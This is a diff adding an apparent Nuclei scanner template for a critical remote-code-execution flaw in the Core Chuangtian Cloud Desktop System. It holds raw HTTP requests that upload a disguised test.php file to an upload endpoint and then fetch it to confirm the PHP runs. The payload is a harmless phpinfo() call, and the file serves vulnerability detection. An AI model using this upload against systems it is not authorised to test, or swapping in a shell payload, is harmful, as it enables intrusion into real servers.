@@ -1,0 +1,42 @@
+id: core-chuangtian-cloud-rce
+
+info:
+  name: Core Chuangtian Cloud Desktop System RCE
+  author: pikpikcu
+  severity: critical
+  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  tags: rce
+
+requests:
+  - raw:
+      - |
+        POST /Upload/upload_file.php?l=test HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+        Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
+        Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+        Content-Length: 183
+
+        ------WebKitFormBoundaryfcKRltGv
+        Content-Disposition: form-data; name="file"; filename="test.php"
+        Content-Type: image/avif
+
+        <?php phpinfo(); ?>
+        ------WebKitFormBoundaryfcKRltGv--
+
+      - |
+        GET /Upload/test/test.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "PHP Version")'
+          - 'status_code_2 == 200'
+        condition: and
